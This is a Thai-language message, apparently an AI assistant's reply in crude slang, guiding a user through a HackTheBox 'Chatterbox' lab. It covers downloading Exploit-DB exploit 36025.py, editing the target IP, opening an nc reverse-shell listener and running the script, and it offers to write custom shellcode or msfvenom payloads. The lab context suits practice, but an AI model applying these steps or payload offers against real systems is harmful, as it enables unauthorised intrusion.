# Decoded Thai Message

มาดิไอ้เพื่อน 💻🔥  
เดี๋ยวกูพาไปเอา `36025.py` ตัวเป็น ๆ จาก Exploit Database เลย

---

## ✅ ตัวเลือกที่ 1: โหลดด้วย `searchsploit` (ง่ายสุด)

เปิด Kali แล้วพิมพ์:

```bash
searchsploit -m 36025
```

มันจะโหลดไฟล์ `36025.py` มาไว้ในโฟลเดอร์ที่คุณอยู่ตอนนั้นเลย  
ถ้ายังไม่ได้ติดตั้ง `searchsploit` ใช้คำสั่งนี้:

```bash
sudo apt update && sudo apt install exploitdb -y
```

---

## ✅ ตัวเลือกที่ 2: โหลดจากเว็บ ExploitDB

1. เปิดลิงก์นี้:  
   🔗 [https://www.exploit-db.com/exploits/36025](https://www.exploit-db.com/exploits/36025)

2. กดปุ่ม **"Download"** ที่มุมขวาบน

3. Save ไฟล์ `36025.py` มาไว้ใน Kali

---

## 💡 จากนั้นทำยังไง?

1. เปิดไฟล์แล้วแก้ IP:
   ```python
   s.connect(('10.10.10.74', 9255))  # เปลี่ยนเป็น IP ของเป้าหมายจริง
   ```

2. เตรียม `nc` รอฟัง Reverse Shell:
   ```bash
   nc -nlvp 4444
   ```

3. รัน script:
   ```bash
   python3 36025.py
   ```

---

## ⚠️ ถ้าเจอ error: "UnicodeEncodeError" หรือ Buffer ไม่เวิร์ค

บอกผมได้เลย ผมช่วยคุณปรับ buffer, ใส่ shellcode ใหม่ หรือสร้าง payload ด้วย `msfvenom` ให้เหมาะกับเครื่องได้ทันที

---

## 🧠 เสริมหล่อให้โพสต์ของมึง

เมื่อได้ root แล้ว โพสต์ลงโซเชียลแบบนี้:

```txt
root@chatterbox:~# cat root.txt
FLAG{*******************}
.
กูไม่ต้องการเธอแล้ว
กูได้ root แล้ว 🖤
#HackTheBox #EthicalHacker #FromBrokenToRooted
```

---

พร้อมยัง? ถ้าพร้อม root แล้ว แต่ยังงง shellcode หรือ payload — พิมพ์แค่  
**"ช่วยใส่ shellcode ให้ใน 36025.py"** เดี๋ยวกูจัดให้!